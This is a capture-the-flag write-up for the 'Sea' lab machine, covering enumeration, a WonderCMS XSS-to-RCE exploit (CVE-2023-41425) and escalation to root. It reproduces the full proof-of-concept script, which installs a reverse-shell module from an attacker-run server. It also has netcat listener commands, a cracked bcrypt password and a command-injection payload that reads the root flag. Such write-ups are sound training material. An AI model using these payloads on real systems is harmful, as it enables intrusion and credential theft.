@@ -1,0 +1,458 @@
+Enumeration
+
+Nmap
+
+sudo nmap -sC -sV -A -T5 -Pn 10.129.2.179
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-06 11:16 +0400
+Nmap scan report for 10.129.2.179
+Host is up (0.17s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
+|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
+|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-title: Sea - Home
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 993/tcp)
+HOP RTT       ADDRESS
+1   163.04 ms 10.10.14.1
+2   163.28 ms 10.129.2.179
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.07 seconds
+
+
+----------------------------------------------------------------------------------------------------------------------
+
+
+Foothold
+
+Accessing port 80 shows a landing page for a company that hosts bike competitions.
+
+Navigating to the How to Participate tab shows that we can contact the company directly through a contact form.
+When clicking the contact link, we are taken to http://sea.htb/contact.php
+so we need to add sea.htb to our /etc/hosts file.
+
+echo "10.129.2.179 sea.htb" | sudo tee -a /etc/hosts
+
+
+
+Accessing the contact page shows us a competition registration form, but testing for standard
+injections doesn't return any results. We focus on enumeration at this stage.
+
+
+
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://sea.htb/FUZZ -c -v
+
+
+[Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 68ms]
+| URL | http://sea.htb/themes
+| --> | http://sea.htb/themes/
+* FUZZ: themes
+
+
+
+We see a directory called themes, so we try to enumerate that folder to see if we can get any
+additional information on the backend components being used.
+
+
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u "http://sea.htb/themes/FUZZ" -c -v
+
+[Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 54ms]
+| URL | http://sea.htb/themes/bike
+| --> | http://sea.htb/themes/bike/
+* FUZZ: bike
+
+
+We can see a theme called bike exists with a lot of 403 responses. Let's try to enumerate that
+directory further. We attempt to discover any potentially sensitive files so we adjust our wordlist
+and only show results for responses with the status code 200 .
+
+ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u "http://sea.htb/themes/bike/FUZZ" -t 200 -fc 403
+
+README.md [Status: 200, Size: 318, Words: 40, Lines: 16, Duration:
+63ms]
+sym/root/home/ [Status: 200, Size: 3650, Words: 582, Lines: 87,
+Duration: 66ms]
+version [Status: 200, Size: 6, Words: 1, Lines: 2, Duration:
+57ms]
+
+
+curl http://sea.htb/themes/bike/README.md
+
+
+# WonderCMS bike theme
+## Description
+Includes animations.
+## Author: turboblack
+## Preview
+![Theme preview](/preview.jpg)
+## How to use
+1. Login to your WonderCMS website.
+2. Click "Settings" and click "Themes".
+3. Find theme in the list and click "install".
+4. In the "General" tab, select theme to activate it.
+
+
+Reading the README.md shows that the backend CMS is WonderCMS
+
+
+Knowing the backend CMS, we now need to find the version. We have the file called version
+which actually discloses the WonderCMS version.
+
+curl http://sea.htb/themes/bike/version
+
+3.2.0
+
+Researching vulnerabilities shows that this version of WonderCMS is vulnerable to CVE-2023-41425 (https://nvd.nist.gov/vuln/detail/CVE-2023-41425)
+which is a cross-site scripting vulnerability allowing remote code execution if exploited
+successfully. Linked in the vulnerability disclosure is a proof of concept (https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413) that explains the attack in
+detail and provides us with a script to exploit the target.
+
+
+# Exploit: WonderCMS XSS to RCE
+import sys
+import requests
+import os
+import bs4
+
+if (len(sys.argv) < 4):
+    print(
+        "usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")
+else:
+    data = '''
+    var url = "''' + str(sys.argv[1]) + '''";
+    if (url.endsWith("/")) {
+     url = url.slice(0, -1);
+    }
+    var urlWithoutLog = url.split("/").slice(0, -1).join("/");
+    var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
+    var token = document.querySelectorAll('[name="token"]')[0].value;
+    var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
+    var xhr3 = new XMLHttpRequest();
+    xhr3.withCredentials = true;
+    xhr3.open("GET", urlRev);
+    xhr3.send();
+    xhr3.onload = function() {
+     if (xhr3.status == 200) {
+       var xhr4 = new XMLHttpRequest();
+       xhr4.withCredentials = true;
+       xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
+       xhr4.send();
+       xhr4.onload = function() {
+         if (xhr4.status == 200) {
+           var ip = "''' + str(sys.argv[2]) + '''";
+           var port = "''' + str(sys.argv[3]) + '''";
+           var xhr5 = new XMLHttpRequest();
+           xhr5.withCredentials = true;
+           xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
+           xhr5.send();
+
+         }
+       };
+     }
+    };
+    '''
+    try:
+        open("xss.js", "w").write(data)
+        print("[+] xss.js is created")
+        print("[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp " + str(
+            sys.argv[3]))
+        print("----------------------------\n")
+        XSSlink = str(sys.argv[1]).replace("loginURL",
+                                           "index.php?page=loginURL?") + "\"></form><script+src=\"http://" + str(
+            sys.argv[2]) + ":8000/xss.js\"></script><form+action=\""
+        XSSlink = XSSlink.strip(" ")
+        print("send the below link to admin:\n\n----------------------------\n" + XSSlink)
+        print("----------------------------\n")
+
+        print("\nstarting HTTP server to allow the access to xss.js")
+        os.system("python3 -m http.server\n")
+    except:
+        print(data, "\n", "//write this to a file")
+
+
+In this script, we see that the author parses the LoginURL from the arguments then writes an XSS
+payload to a file called xss.js which uses XMLHttpRequest to load the page and grab the CSRF
+token, then installs the malicious module from their GitHub account. After the module is installed
+they use their rev.php file to send a reverse shell back to the attacker. To trigger the initial XSS
+vulnerability, the author of the PoC injects an XSS payload into the LoginURL form which grabs
+our malicious JavaScript file and performs the module installation. To successfully attack this,
+we need to grab the malicious module and since the script already starts a HTTP server on default
+port 8000 , we can just use the script's server to host our files.
+
+
+wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
+
+At this point, we change the PoC to point to our web server.
+
+
+var urlRev = urlWithoutLogBase+"/?
+installModule=http://10.10.14.141:8000/main.zip&directoryName=violet&type=themes&t
+oken=" + token;
+
+With everything in place, in a separate terminal we start a Netcat listener.
+
+nc -lvvp 4444
+
+Now in the original terminal, we execute the attack:
+
+python3 exploit.py http://sea.htb/index.php?page=LoginURL 10.10.14.141 4444
+
+We are provided a link to send to the administrator. Let's use the contact form to send this link.
+
+After waiting briefly, we see that the admin clicked our link:
+
+starting HTTP server to allow the access to xss.js
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.76.146 - - [19/Dec/2024 13:41:25] "GET /xss.js HTTP/1.1" 200 -
+
+We got a successful hit on the Python web server, but we didn't get any shell connecting back to
+us. At this point, we analyze the code of the PoC and notice some issues using the web browser's
+console to debug.
+
+From the output, we can see that the URL parsing is not successful, as the final
+urlWithoutLogBase only returns / , so essentially the XHR request is making a request to
+/index.php?LoginURL . We fix this by explicitly changing the urlWithoutLoginBase to reflect
+http://sea.htb .
+
+var urlWithoutLogBase = "http://sea.htb";
+
+After running the PoC again, we now successfully get a reverse shell as www-data user.
+
+and in browser: http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.24&lport=9001
+
+so we get shell from netcat
+
+--------------------------------------------------------------------------------------------------------------------
+
+Stabilizing the shell
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+stty raw echo;fg
+
+export TERM=xterm
+
+----------------------------------------------------------------------------------------
+
+First, what we can to, is to go to the database:
+
+locatiom: www-data@sea:/etc/apache2/sites-enabled$
+
+command: cat sea.conf
+
+
+
+
+<VirtualHost *:80>
+     ServerAdmin sea@sea.htb
+     DocumentRoot /var/www/sea/
+     ServerName sea.htb
+     ServerAlias sea.htb
+     <Directory /var/www/sea/>
+          Options FollowSymlinks
+          AllowOverride All
+          Require all granted
+     </Directory>
+
+     ErrorLog ${APACHE_LOG_DIR}/error.log
+     CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+</VirtualHost>
+
+
+
+
+we can see the DocumentRoot: /var/www/sea/
+
+
+Go
+
+cd /var/www/sea/
+
+ls
+
+contact.php  data  index.php  messages	plugins  themes
+
+
+lets go to data
+
+cd data
+
+ls
+
+cache.json  database.js  files
+
+less database.js
+
+
+{
+    "config": {
+        "siteTitle": "Sea",
+        "theme": "bike",
+        "defaultPage": "home",
+        "login": "loginURL",
+        "forceLogout": false,
+        "forceHttps": false,
+        "saveChangesPopup": false,
+        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
+        "lastLogins": {
+            "2026\/03\/06 13:00:55": "127.0.0.1",
+            "2026\/03\/06 12:35:24": "127.0.0.1",
+            "2026\/03\/06 12:29:53": "127.0.0.1",
+            "2026\/03\/06 12:26:23": "127.0.0.1",
+            "2026\/03\/06 12:25:53": "127.0.0.1"
+        },
+        "lastModulesSync": "2026\/03\/06",
+        "customModules": {
+            "themes": {},
+            "plugins": {}
+        },
+
+
+SO WE SEE THE PASSWORD HASH
+
+lets save hash to file for hashcat (without \)
+
+echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt
+
+
+our hash has $2y$ prefix, so it is bcrypt. for bcrypt we will use the mode:  -m 3200
+
+
+lets start hashcat:
+
+hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+after this, we have a password:
+
+$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
+
+go to find a users:
+
+cat /etc/passwd | grep sh$
+
+
+root:x:0:0:root:/root:/bin/bash
+amay:x:1000:1000:amay:/home/amay:/bin/bash
+geo:x:1001:1001::/home/geo:/bin/bash
+
+
+lets try amay
+
+su - amay
+
+ls
+
+cat user.txt
+
+<USER_FLAG>
+
+
+----------------------------------------------------------------------------------------------------------------------
+
+
+Privilege Escalation
+
+We enumerate the system checking if there are any other ports open internally.
+
+
+netstat -ntlp
+
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:50551         0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+
+
+We can see that port 8080 is open internally. We forward that port to our local machine using SSH
+
+
+ssh amay@sea.htb -L 8080:127.0.0.1:8080
+
+amay@sea:/etc$ grep -R 8080 . 2>/dev/null
+
+./systemd/system/multi-user.target.wants/monitoring.service:ExecStart=/usr/bin/php -S localhost:8080 -t /root/monitoring
+./systemd/system/monitoring.service:ExecStart=/usr/bin/php -S localhost:8080 -t /root/monitoring
+./services:http-alt	8080/tcp	webcache	# WWW caching service
+./apache2/magic:0	lelong&0x8080ffff	0x0000081a	application/x-arc	lzw
+./apache2/magic:0	lelong&0x8080ffff	0x0000091a	application/x-arc	squashed
+./apache2/magic:0	lelong&0x8080ffff	0x0000021a	application/x-arc	uncompressed
+./apache2/magic:0	lelong&0x8080ffff	0x0000031a	application/x-arc	packed
+./apache2/magic:0	lelong&0x8080ffff	0x0000041a	application/x-arc	squeezed
+./apache2/magic:0	lelong&0x8080ffff	0x0000061a	application/x-arc	crunched
+./apache2/magic:0       	lelong&0x8080ffff	0x0000081a	application/x-arc
+./apache2/magic:0		lelong&0x8080ffff	0x0000091a	application/x-arc
+./apache2/magic:0		lelong&0x8080ffff	0x0000021a	application/x-arc
+./apache2/magic:0		lelong&0x8080ffff	0x0000031a	application/x-arc
+./apache2/magic:0		lelong&0x8080ffff	0x0000041a	application/x-arc
+./apache2/magic:0		lelong&0x8080ffff	0x0000061a	application/x-arc
+./ssh/moduli:20190427180808 2 6 100 3071 5 E7A9F2E16494A110F823F0C90DFE9CC40005B24122176C6C6525F90F736433F094527C6DB9032736C471474E93E7DAB28D9CC80DC6C93EF27473EFE0F4A3A3AFBC07C0BA0DEFA0C73C075700D69F950499B634B197AD2B4E32712E80AEC3D463DAD26397FEB80B1DE1DBF96C7BF1CAEF1A47E39D135A5D941BF1ECE9186CF23C785E2B368B8AFC24E120EA6956EB97206AD0C80DE87D092190A049E0E12F340E41C6EFE13F1C19A63763B90C4E9099D0011FA62913194E4671998FAE8847EA077F506D394ACBCF139DF20A9C36BDC1B82F905BF1975C9D4322EF2E9165EC2C0FAAEEABED7EF759F4D4BD764A5BA4043085CE3D679B0CE5C79340CF92E35D7A931A0B4A52B3447EBF7E2E2633EE221989B8A9E2C598A058CFBFCA4800BAFFBD8F9B9B3068AC18A0A030EC0CDE39439DFFFA8C42EDF7D4FC1D4E6D455A7387BCBE7EF973B3452E026707189CE35086A3B7B82BE0DF2824972794435DC8A76AC110CE46FADCF5C0BC070A61F14CEFB6B8EFCEA85B0F320D441B7DC1CBA215D1C7E7
+Binary file ./ssl/certs/java/cacerts matches
+
+
+as we can see, we have System Monitoring Service, lets cat this file:
+
+cat ./systemd/system/monitoring.service
+
+
+[Unit]
+Description=System Monitoring Developing
+After=network.target
+
+[Service]
+User=root
+Group=root
+ExecStart=/usr/bin/php -S localhost:8080 -t /root/monitoring
+WorkingDirectory=/root/monitoring
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+
+
+we cant work with this directory directly (/root/monitoring),
+
+but we ca can implement port forwarding
+
+ssh amay@sea.htb -L 8081:127.0.0.1:8080  (we use 8081, couse the burp runs on 8080)
+
+
+after this we go to 127.0.0.1:8081 and login
+
+intercept POST request with Burp
+
+
+
+
+
+
+
+
+
+
+curl -X POST http://localhost:8080/ -u amay:mychemicalromance -d "log_file=/root/root.txt;cat&analyze_log="
+
+
+
+root flag:  <ROOT_FLAG>
